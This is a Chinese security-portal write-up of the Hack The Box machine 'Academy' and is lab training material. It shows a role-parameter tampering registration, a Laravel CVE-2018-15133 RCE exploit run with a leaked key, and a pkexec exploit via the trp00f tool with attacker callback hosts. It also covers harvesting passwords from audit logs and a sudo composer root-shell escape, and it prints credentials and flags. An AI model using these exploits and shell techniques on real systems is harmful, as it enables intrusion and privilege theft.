---
title: [Meachines] [Easy] Academy Laravel-RCE+TRP00F权限提升+audit服务日志权限提升+composer权限提升
url: https://www.freebuf.com/articles/web/420868.html
source: FreeBuf网络安全行业门户
date: 2025-01-27
fetch_date: 2025-10-06T20:08:22.945922
---

# [Meachines] [Easy] Academy Laravel-RCE+TRP00F权限提升+audit服务日志权限提升+composer权限提升

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

[Meachines] [Easy] Academy Laravel-RCE+TRP00F权限提升+audit服务日志权限提升+composer权限提升

* ![]()
* 关注

* [Web安全](https://www.freebuf.com/articles/web)

[Meachines] [Easy] Academy Laravel-RCE+TRP00F权限提升+audit服务日志权限提升+composer权限提升

2025-01-26 22:42:12

所属地 福建省

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
本文由
创作，已纳入「FreeBuf原创奖励计划」，未授权禁止转载

# Information Gathering

| IP Address | Opening Ports |
| --- | --- |
| 10.10.10.215 | **TCP**:22,80,33060 |

`$ sudo masscan -p1-65535,U:1-65535 10.10.10.215 --rate=1000 -p1-65535,U:1-65535 -e tun0 > /tmp/ports`
`$ ports=$(cat /tmp/ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
`$ nmap -Pn -sV -sC -p$ports 10.10.10.215`

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://academy.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
33060/tcp open  mysqlx?
| fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
|     Invalid message"
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94SVN%I=7%D=1/26%Time=67962C32%P=x86_64-pc-linux-gnu%
SF:r(NULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x
SF:0b\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTT
SF:POptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\
SF:x0b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSV
SF:ersionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTC
SF:P,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x
SF:0fInvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\
SF:0")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\
SF:x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCoo
SF:kie,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0
SF:b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20messag
SF:e\"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNe
SF:g,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x
SF:05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05
SF:HY000")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDStri
SF:ng,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message
SF:\"\x05HY000")%r(LDAPBindReq,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SIPOpti
SF:ons,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NCP,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0\x0b\x08\x05
SF:\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY
SF:000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WMSRequest,9,"\x05\
SF:0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,9,"\x05\0\0\0\x0b\x08\x05\x1a\0"
SF:)%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message
SF:\"\x05HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Laravel Framework

![image-1.png](https://image.3001.net/images/20250126/1737902138_6796483a4c89ffbed0efc.png!small)

`# echo '10.10.10.215 academy.htb'>>/etc/hosts`

`$ dirsearch -u academy.htb`

![image.png](https://image.3001.net/images/20250126/1737902141_6796483d2feb9fad49795.png!small)

`uid=adm&password=adm&confirm=adm&roleid=1`

![image-3.png](https://image.3001.net/images/20250126/1737902145_6796484186ace0b736973.png!small)

http://academy.htb/admin.php

`username:adm`
`password:adm`

![image-4.png](https://image.3001.net/images/20250126/1737902149_67964845a8fa906112c24.png!small)

`# echo '10.10.10.215 dev-staging-01.academy.htb'>>/etc/hosts`

`$ whatweb http://dev-staging-01.academy.htb/ -v`

![image-5.png](https://image.3001.net/images/20250126/1737902153_679648493ce4c11476bdc.png!small)

> j.boggiano@seld.be,stof@notk.org

`$ git clone https://github.com/aljavier/exploit_laravel_cve-2018-15133`
`$ cd exploit_laravel_cve-2018-15133/`
`$ pip3 install -r requirements.txt`
`$ python3 pwn_laravel.py http://dev-staging-01.academy.htb dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= --interactive`

![image-6.png](https://image.3001.net/images/20250126/1737902156_6796484ca98dd4f82d284.png!small)

# www-data to cry0l1t3

![image-7.png](https://image.3001.net/images/20250126/1737902171_6796485bbc976df752146.png!small)

`$ su cry0l1t3`

`password:mySup3rP4s5w0rd!!`

![image-8.png](https://image.3001.net/images/20250126/1737902224_67964890d034784f84c95.png!small)

## User.txt

> 681bcfc1ee52a4e797c0fb16e81a9af4

# Privilege Escalation

## TRP00F

https://github.com/MartinxMax/trp00f

`$ python3 trp00f.py --lhost 10.10.16.16 --lport 10022 --rhost 10.10.16.16 --rport 443 --http 1111 --password 'mySup3rP4s5w0rd!!'`

`[!] Do you want to exploit the vulnerability in file 'pkexec' ? (y/n) >y`

![image-9.png](https://image.3001.net/images/20250126/1737902236_6796489c760916420175a.png!small)

## audit

### cry0l1t3 to mrb3n

![image-10.png](https://image.3001.net/images/20250126/1737902294_679648d694e3d1267d6ca.png!small)

`$ aureport --tty`

![image-11.png](https://image.3001.net/images/20250126/1737902298_679648da17474751e2c94.png!small)

`password:mrb3n_Ac@d3my!`

### PE

![image-12.png](https://image.3001.net/images/20250126/1737902302_679648deb97a5298ca773.png!small)

```
TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
sudo composer --working-dir=$TF run-script x
```

![image-13.png](https://image.3001.net/images/20250126/1737902306_679648e2e6af869c6ed69.png!small)

## Root.txt

> f44c2b56ff571a21b8e1fa983be91be3

# CTF

免责声明

1.一般免责声明：本文所提供的技术信息仅供参考，不构成任何专业建议。读者应根据自身情况谨慎使用且应遵守《中华人民共和国网络安全法》，作者及发布平台不对因使用本文信息而导致的任何直接或间接责任或损失负责。

2. 适用性声明：文中技术内容可能不适用于所有情况或系统，在实际应用前请充分测试和评估。若因使用不当造成的任何问题，相关方不承担责任。

3. 更新声明：技术发展迅速，文章内容可能存在滞后性。读者需自行判断信息的时效性，因依据过时内容产生的后果，作者及发布平台不承担责任。

![]()

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
已在FreeBuf发表 0 篇文章

本文为 独立观点，未经授权禁止转载。
如需授权、对文章有疑问或需删除稿件，请联系 FreeBuf
客服小蜜蜂（微信：freebee1024）

被以下专辑收录，发现更多精彩内容

+ 收入我的专辑

+ 加入我的收藏

展开更多

相关推荐

![]()

关 注

* 0 文章数
* 0 关注者

文章目录

User.txt

TRP00F

audit

* cry0l1t3 to mrb3n
* PE

Root.txt

![](/images/logo_b.png)

本站由阿里云 提供计算与安全服务

### 用户服务

* [有奖投稿](https://www.freebuf.com/write)
* [提交漏洞](https://www.vulbox.com/bounties/detail-72)
* [参与众测](https://www.vulbox.com/projects/list)
* [商城](https://shop.freebuf.com)

### 企业服务

* [安全咨询](https://company.freebuf.com)
* [产业全景图](https://www.freebuf...